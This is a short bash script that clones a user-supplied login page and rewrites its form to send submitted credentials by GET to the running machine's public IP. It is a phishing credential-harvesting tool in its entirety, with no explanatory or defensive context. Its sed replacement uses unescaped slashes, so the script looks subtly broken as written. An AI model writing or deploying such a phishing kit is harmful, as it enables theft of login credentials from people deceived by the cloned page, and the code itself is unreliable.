#!/bin/bash
ip=$(curl -s ifconfig.me)
printf "Please provide a login page link: "
read page
curl -sL $page > login.html
sed -i 's/action="[^"]*/action="http://$ip/login.php' login.html
sed -i 's/method="[^"]*/method="get/' login.html
